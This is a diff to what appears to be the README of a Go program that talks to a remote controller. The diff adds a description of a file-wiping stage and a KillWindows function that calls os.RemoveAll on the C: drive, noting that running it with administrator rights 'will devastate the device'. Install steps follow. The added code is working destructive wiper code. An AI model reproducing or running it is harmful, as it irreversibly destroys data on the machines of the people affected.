@@ -102,6 +102,18 @@ After sending the termination command to the controller, the program sends an ad
 		resp, err := client.Do(req)
 ```
 
+The program proceeds to wipe the filesystem of the device, deleting files accessible and owned by the current user. The damage from this function is dependent on administrative privileges and security context in which the program is run. Running the program as root or administrator will devastate the device.
+
+```go
+func KillWindows() {
+	// If current user does not have administrative privileges, removes files owned by current user
+	err := os.RemoveAll("C:\\")
+	if err != nil {
+		return			
+	}
+}
+```
+
 # Install: 
 
 Download the repository:
